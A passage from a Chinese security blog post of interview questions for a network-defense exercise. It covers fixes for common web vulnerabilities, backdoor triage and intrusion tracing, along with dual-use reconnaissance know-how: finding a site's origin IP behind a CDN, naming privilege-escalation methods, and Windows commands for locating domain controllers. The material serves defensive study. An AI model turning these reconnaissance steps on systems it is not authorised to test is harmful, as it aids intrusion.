+<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://raw.githubusercontent.com/Cloudyunn/img/master/note/202201101519628.png" alt="CSRF原理"></p>
+<h2 id="SQL注入、反序列化、文件包含、文件上传、CSRF、XSS、XXE漏洞的修复方法"><a href="#SQL注入、反序列化、文件包含、文件上传、CSRF、XSS、XXE漏洞的修复方法" class="headerlink" title="SQL注入、反序列化、文件包含、文件上传、CSRF、XSS、XXE漏洞的修复方法"></a>SQL注入、反序列化、文件包含、文件上传、CSRF、XSS、XXE漏洞的修复方法</h2><ul>
+<li>sql注入：<ul>
+<li>所有查询语句都使用数据库的参数化查询接口，并且参数化语句使用参数，而不是将用户输入变量直接嵌入到SQL语句中。</li>
+<li>对进入数据库的特殊字符（’”&lt;&gt;&amp;*;等）进行转义处理，或编码转换</li>
+<li>应严格规定数据长度，防止较长的SQL注入语句</li>
+<li>不回显错误信息</li>
+<li>严格限制网站用户数据库操作权限</li>
+</ul>
+</li>
+<li>反序列化：<ul>
+<li>升级到最新版本</li>
+</ul>
+</li>
+<li>文件包含：<ul>
+<li>设置文件上传白名单</li>
+<li>升级程序</li>
+</ul>
+</li>
+<li>文件上传：<ul>
+<li>上传文件的存储目录禁用执行权限</li>
+<li>文件后缀白名单，注意0x00截断攻击</li>
+<li>文件上传后修改文件名</li>
+<li>不能有本地文件包含漏洞</li>
+<li>及时修复web上代码</li>
+<li>升级web server</li>
+</ul>
+</li>
+<li>CSRF<ul>
+<li>验证http referer字段</li>
+<li>请求地址中添加token并验证</li>
+<li>在http头中自定义属性并验证</li>
+</ul>
+</li>
+<li>XSS<ul>
+<li>创建参数拦截filter类过滤器，对每次Post请求或者PUT请求坐下拦截</li>
+</ul>
+</li>
+<li>XXE<ul>
+<li>进制加载外部实体</li>
+<li>不允许XML中含有任何自己声明的DTD</li>
+</ul>
+</li>
+</ul>
+<h2 id="如果网站有CDN，你如何查看他的真实IP地址"><a href="#如果网站有CDN，你如何查看他的真实IP地址" class="headerlink" title="如果网站有CDN，你如何查看他的真实IP地址"></a>如果网站有CDN，你如何查看他的真实IP地址</h2><blockquote>
+<p>查询子域名 </p>
+<p>网络空间引擎搜索法（钟馗之眼) </p>
+<p>利用SSL证书寻找真实原始IP </p>
+<p>利用HTTP标头寻找真实原始IP </p>
+<p>利用网站返回的内容寻找真实原始IP</p>
+<p>网站邮件订阅查找</p>
+<p>用 Zmap 扫全网</p>
+</blockquote>
+<h2 id="如何判断是否有CDN"><a href="#如何判断是否有CDN" class="headerlink" title="如何判断是否有CDN"></a>如何判断是否有CDN</h2><p>CDN的全称是Content Delivery Network，即内容分发网络。通过在网络各处放置节点服务 器所构成的在现有的互联网基础之上的一层智能虚拟网络。其目的就是使用户可以就近取得所需的内容，解决Internet网络拥挤的状况，提高用户访问网络 的响应速度。</p>
+<p><strong>检测方法</strong>：在Linux下使用dig命令进行测试或者DOS下使用nslookup进行测试。还有一个办法就是在不同的地区ping网址，如果都是同一个IP地址，则说明未使用CDN，如果是不同的 IP地址则说明使用了CDN。</p>
+<h2 id="常见提权方式"><a href="#常见提权方式" class="headerlink" title="常见提权方式"></a>常见提权方式</h2><p>udf提权、mof提权、启动项提权等</p>
+<h2 id="如果服务器被入侵，你会怎样进行溯源"><a href="#如果服务器被入侵，你会怎样进行溯源" class="headerlink" title="如果服务器被入侵，你会怎样进行溯源"></a>如果服务器被入侵，你会怎样进行溯源</h2><ul>
+<li>网站源码分析、审计</li>
+<li>日志分析</li>
+<li>系统存储信息分析</li>
+<li>分析进程端口</li>
+</ul>
+<h2 id="常见的中间件解析漏洞有哪些"><a href="#常见的中间件解析漏洞有哪些" class="headerlink" title="常见的中间件解析漏洞有哪些"></a>常见的中间件解析漏洞有哪些</h2><ul>
+<li>1、IIS<ul>
+<li>PUT漏洞</li>
+<li>短文件名猜解</li>
+<li>远程代码执行</li>
+<li>解析漏洞</li>
+</ul>
+</li>
+<li>2、Apache<ul>
+<li>解析漏洞</li>
+<li>目录遍历</li>
+</ul>
+</li>
+<li>3、Nginx<ul>
+<li>文件解析</li>
+<li>目录遍历</li>
+<li>CRLF注入</li>
+<li>目录穿越</li>
+</ul>
+</li>
+<li>4、Tomcat<ul>
+<li>远程代码执行</li>
+<li>war后门文件部署</li>
+</ul>
+</li>
+<li>5、jBoss<ul>
+<li>反序列化漏洞</li>
+<li>war后门文件部署</li>
+</ul>
+</li>
+<li>6、Weblogic<ul>
+<li>反序列化漏洞</li>
+<li>SSRF</li>
+<li>任意文件上传</li>
+<li>war后门文件部署</li>
+</ul>
+</li>
+</ul>
+<h2 id="在Windows-linux的加固问题上，你有哪些方法"><a href="#在Windows-linux的加固问题上，你有哪些方法" class="headerlink" title="在Windows/linux的加固问题上，你有哪些方法"></a>在Windows/linux的加固问题上，你有哪些方法</h2><h2 id="linux服务器被植入后门了，讲一下你的排查流程"><a href="#linux服务器被植入后门了，讲一下你的排查流程" class="headerlink" title="linux服务器被植入后门了，讲一下你的排查流程"></a>linux服务器被植入后门了，讲一下你的排查流程</h2><ul>
+<li>（1）检查系统日志<ul>
+<li>检查系统错误登录日志，统计IP重试次数</li>
+</ul>
+</li>
+<li>（2）检查系统用户<ul>
+<li>查看是否有异常的系统用户</li>
+</ul>
+</li>
+<li>（3）检查异常进程<ul>
+<li>注意UID为0的进程</li>
+</ul>
+</li>
+<li>（4）检查异常系统文件</li>
+<li>（5）检查系统文件完整性</li>
+<li>（6）检查RPM的完整性</li>
+<li>（7）检查网络</li>
+<li>（8）检查系统后门</li>
+<li>（9）检查系统服务</li>
+<li>（10）检查rootkit</li>
+</ul>
+<h2 id="怎么查找域控"><a href="#怎么查找域控" class="headerlink" title="怎么查找域控"></a>怎么查找域控</h2><p>1、net view</p>
+<pre class="line-numbers language-none"><code class="language-none">net view /domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>2、set log</p>
+<pre class="line-numbers language-none"><code class="language-none">set log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>3、通过srv记录</p>
+<pre class="line-numbers language-none"><code class="language-none">nslookup -type=SRV _ldap._tcp.corp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>4、使用nltest</p>
+<pre class="line-numbers language-none"><code class="language-none">nltest /dclist:corp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>5、使用dsquery</p>
+<pre class="line-numbers language-none"><code class="language-none">DsQuery Server -domain corp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>6、使用netdom</p>
+<pre class="line-numbers language-none"><code class="language-none">netdom query pdc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Cloudyun</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://cloudyunn.github.io/posts/7.html">https://cloudyunn.github.io/posts/7.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://cloudyunn.github.io" target="_blank">Cloudyun</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BD%91%E5%AE%89/">网安</a></div><div class="post_share"><div class="social-share" data-image="https://s4.ax1x.com/2022/01/09/7kCdnf.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://s4.ax1x.com/2022/01/06/TzLGkQ.jpg" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s4.ax1x.com/2022/01/06/TzLGkQ.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://s4.ax1x.com/2022/01/06/TzLJYj.jpg" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s4.ax1x.com/2022/01/06/TzLJYj.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/posts/6.html"><img class="next-cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s4.ax1x.com/2022/01/06/Tx6hzn.jpg" onerror="onerror=null;src='https://cdn.jsdelivr.net/gh/zhaoze-jpg/Xianqi@main/img/friend_404.gif'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Fuzzing论文阅读笔记(一)</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s4.ax1x.com/2021/12/21/TK9yTg.jpg" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/zhaoze-jpg/Xianqi@main/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Cloudyun</div><div class="author-info__description">忆我少年游，一梦到华胥</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">6</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div></div><a class="button--animated" id="card-info-btn" href="cloudyunn.github.io"><i class="fab fa-home"></i><span>个人主页</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Cloudyunn" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="tencent://AddContact/?fromId=45&amp;fromSubId=1&amp;subcmd=all&amp;uin=xxxxxxx&amp;website=www.qtxml.cn" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">安慰愤怒的我，拥抱平凡的我</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%88%E4%BB%8B%E7%BB%8D%E4%B8%8B%E4%BD%A0%E7%9A%84%E6%8A%80%E6%9C%AF%E6%83%85%E5%86%B5"><span class="toc-number">1.1.</span> <span class="toc-text">先介绍下你的技术情况</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E6%9E%9C%E8%AE%A9%E4%BD%A0%E6%B8%97%E9%80%8F%E4%B8%80%E4%B8%AA%E7%BD%91%E7%AB%99%EF%BC%8C%E4%BD%A0%E7%9A%84%E6%80%9D%E8%B7%AF%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">1.2.</span> <span class="toc-text">如果让你渗透一个网站，你的思路是什么？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%B4%E4%B8%80%E4%BA%9B%E8%BF%91%E6%AE%B5%E6%97%B6%E9%97%B4%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.</span> <span class="toc-text">说一些近段时间你了解的漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A5%E5%89%8D%E6%8C%96%E8%BF%87%E5%93%AA%E4%BA%9B%E7%BD%91%E7%AB%99%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.4.</span> <span class="toc-text">以前挖过哪些网站的漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%B4%E5%87%A0%E4%B8%AA%E4%BD%A0%E6%AF%94%E8%BE%83%E5%B8%B8%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7"><span class="toc-number">1.5.</span> <span class="toc-text">说几个你比较常用的工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E5%8F%B7%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%9C%8D%E5%8A%A1%E3%80%81%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.6.</span> <span class="toc-text">常见端口号及相关服务、漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-number">1.7.</span> <span class="toc-text">SQL注入原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.8.</span> <span class="toc-text">反序列化漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%8E%BB%E6%B5%8B%E8%AF%95SQL%E6%B3%A8%E5%85%A5-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-XSS-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.9.</span> <span class="toc-text">如何去测试SQL注入&#x2F;反序列化&#x2F;XSS&#x2F;文件上传&#x2F;越权漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%9C%89%E5%93%AA%E4%BA%9B"><span class="toc-number">1.10.</span> <span class="toc-text">文件上传漏洞的绕过方法有哪些</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%9C%89%E5%93%AA%E4%BA%9B%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95"><span class="toc-number">1.11.</span> <span class="toc-text">SQL注入漏洞有哪些利用手法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AF%94%E8%BE%83%E5%96%9C%E6%AC%A2%E7%94%A8%E5%93%AA%E5%87%A0%E7%A7%8D%E5%B7%A5%E5%85%B7%EF%BC%8C%E5%AE%83%E4%BB%AC%E7%9A%84%E4%BC%98%E5%8A%BF%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">1.12.</span> <span class="toc-text">比较喜欢用哪几种工具，它们的优势是什么</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">1.13.</span> <span class="toc-text">CSRF漏洞的原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E3%80%81%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E3%80%81%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E3%80%81CSRF%E3%80%81XSS%E3%80%81XXE%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%B3%95"><span class="toc-number">1.14.</span> <span class="toc-text">SQL注入、反序列化、文件包含、文件上传、CSRF、XSS、XXE漏洞的修复方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E6%9E%9C%E7%BD%91%E7%AB%99%E6%9C%89CDN%EF%BC%8C%E4%BD%A0%E5%A6%82%E4%BD%95%E6%9F%A5%E7%9C%8B%E4%BB%96%E7%9A%84%E7%9C%9F%E5%AE%9EIP%E5%9C%B0%E5%9D%80"><span class="toc-number">1.15.</span> <span class="toc-text">如果网站有CDN，你如何查看他的真实IP地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E6%9C%89CDN"><span class="toc-number">1.16.</span> <span class="toc-text">如何判断是否有CDN</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F"><span class="toc-number">1.17.</span> <span class="toc-text">常见提权方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E6%9E%9C%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A2%AB%E5%85%A5%E4%BE%B5%EF%BC%8C%E4%BD%A0%E4%BC%9A%E6%80%8E%E6%A0%B7%E8%BF%9B%E8%A1%8C%E6%BA%AF%E6%BA%90"><span class="toc-number">1.18.</span> <span class="toc-text">如果服务器被入侵，你会怎样进行溯源</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%9C%89%E5%93%AA%E4%BA%9B"><span class="toc-number">1.19.</span> <span class="toc-text">常见的中间件解析漏洞有哪些</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8Windows-linux%E7%9A%84%E5%8A%A0%E5%9B%BA%E9%97%AE%E9%A2%98%E4%B8%8A%EF%BC%8C%E4%BD%A0%E6%9C%89%E5%93%AA%E4%BA%9B%E6%96%B9%E6%B3%95"><span class="toc-number">1.20.</span> <span class="toc-text">在Windows&#x2F;linux的加固问题上，你有哪些方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A2%AB%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8%E4%BA%86%EF%BC%8C%E8%AE%B2%E4%B8%80%E4%B8%8B%E4%BD%A0%E7%9A%84%E6%8E%92%E6%9F%A5%E6%B5%81%E7%A8%8B"><span class="toc-number">1.21.</span> <span class="toc-text">linux服务器被植入后门了，讲一下你的排查流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E6%9F%A5%E6%89%BE%E5%9F%9F%E6%8E%A7"><span class="toc-number">1.22.</span> <span class="toc-text">怎么查找域控</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/7.html" title="东奥护网项目面试问题.md"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s4.ax1x.com/2022/01/09/7kCdnf.png" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/zhaoze-jpg/Xianqi@main/img/friend_404.gif'" alt="东奥护网项目面试问题.md"/></a><div class="content"><a class="title" href="/posts/7.html" title="东奥护网项目面试问题.md">东奥护网项目面试问题.md</a><time datetime="2022-01-09T09:36:01.000Z" title="发表于 2022-01-09 17:36:01">2022-01-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/6.html" title="Fuzzing论文阅读笔记(一)"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s4.ax1x.com/2022/01/06/Tx6hzn.jpg" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/zhaoze-jpg/Xianqi@main/img/friend_404.gif'" alt="Fuzzing论文阅读笔记(一)"/></a><div class="content"><a class="title" href="/posts/6.html" title="Fuzzing论文阅读笔记(一)">Fuzzing论文阅读笔记(一)</a><time datetime="2022-01-06T03:28:20.000Z" title="发表于 2022-01-06 11:28:20">2022-01-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/4.html" title="深入理解计算机系统(二)——信息的表示和处理"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s4.ax1x.com/2022/01/04/TLf9eO.jpg" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/zhaoze-jpg/Xianqi@main/img/friend_404.gif'" alt="深入理解计算机系统(二)——信息的表示和处理"/></a><div class="content"><a class="title" href="/posts/4.html" title="深入理解计算机系统(二)——信息的表示和处理">深入理解计算机系统(二)——信息的表示和处理</a><time datetime="2022-01-04T11:28:00.000Z" title="发表于 2022-01-04 19:28:00">2022-01-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/3.html" title="深入理解计算机系统(一)"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s4.ax1x.com/2021/12/29/Tc6Cbn.png" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/zhaoze-jpg/Xianqi@main/img/friend_404.gif'" alt="深入理解计算机系统(一)"/></a><div class="content"><a class="title" href="/posts/3.html" title="深入理解计算机系统(一)">深入理解计算机系统(一)</a><time datetime="2021-12-29T07:18:00.000Z" title="发表于 2021-12-29 15:18:00">2021-12-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/2.html" title="Go学习笔记"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s4.ax1x.com/2021/12/21/TKCVjP.jpg" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/zhaoze-jpg/Xianqi@main/img/friend_404.gif'" alt="Go学习笔记"/></a><div class="content"><a class="title" href="/posts/2.html" title="Go学习笔记">Go学习笔记</a><time datetime="2021-12-21T06:17:06.000Z" title="发表于 2021-12-21 14:17:06">2021-12-21</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022  <i id="heartbeat" class="fa fas fa-heartbeat"></i> Cloudyun</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div><head><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></head></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: '3FhzzOf9adU6BTrugxetNi0g-MdYXbMMI',
+      appKey: 'J8477pu5qR8IdlvCb3dfIySL',
+      placeholder: '畅所欲言！',
+      avatar: 'monsterid',
+      meta: 'nick,mail,link'.split(','),
+      pageSize: '10',
+      lang: 'zh-CN',
+      recordIP: false,
+      serverURLs: '',
+      emojiCDN: '',
+      emojiMaps: "",
+      enableQQ: false,
+      path: window.location.pathname,
+      requiredFields: ["nick,mail"],
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  var disqus_config = function () {
+    this.page.url = 'https://cloudyunn.github.io/posts/7.html'
+    this.page.identifier = 'posts/7.html'
+    this.page.title = '东奥护网项目面试问题.md'
+  };
+
+  window.disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://Cloudyun.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+}
+
+if ('Valine' === 'Disqus' || !true) {
+  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script></div><script defer id="dsq-count-scr" src="//xianqi.disqus.com/count.js" async></script><script defer type="text/javascript" src="https://cdn.jsdelivr.net/gh/zhaoze-jpg/Xianqi@main/js/animate.js"></script><div class="aplayer no-destroy" data-id="7965719603" data-server="tencent" data-type="playlist" data-fixed="true" data-mini="true" data-listFolded="false" data-order="random" data-preload="auto" data-autoplay="true" muted></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script>window.$crisp = [];
+window.CRISP_WEBSITE_ID = "482d6e0b-ea62-40df-8441-51800cdfab1c";
+(function () {
+  d = document;
+  s = d.createElement("script");
+  s.src = "https://client.crisp.chat/l.js";
+  s.async = 1;
+  d.getElementsByTagName("head")[0].appendChild(s);
+})();
+$crisp.push(["safe", true])
+
+if (false) {
+  $crisp.push(["do", "chat:hide"])
+  $crisp.push(["on", "chat:closed", function() {
+    $crisp.push(["do", "chat:hide"])
+  }])
+  var chatBtnFn = () => {
+    var chatBtn = document.getElementById("chat_btn")
+    chatBtn.addEventListener("click", function(){
+      $crisp.push(["do", "chat:show"])
+      $crisp.push(["do", "chat:open"])
+
+    });
+  }
+  chatBtnFn()
+} else {
+  if (false) {
+    function chatBtnHide () {
+      $crisp.push(["do", "chat:hide"])
+    }
+    function chatBtnShow () {
+      $crisp.push(["do", "chat:show"])
+    }
+  }
+}</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = [
+  'title',
+  '#config-diff',
+  '#body-wrap',
+  '#rightside-config-hide',
+  '#rightside-config-show',
+  '.js-pjax'
+]
+
+if (false) {
+  pjaxSelectors.unshift('meta[property="og:image"]', 'meta[property="og:title"]', 'meta[property="og:url"]')
+}
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
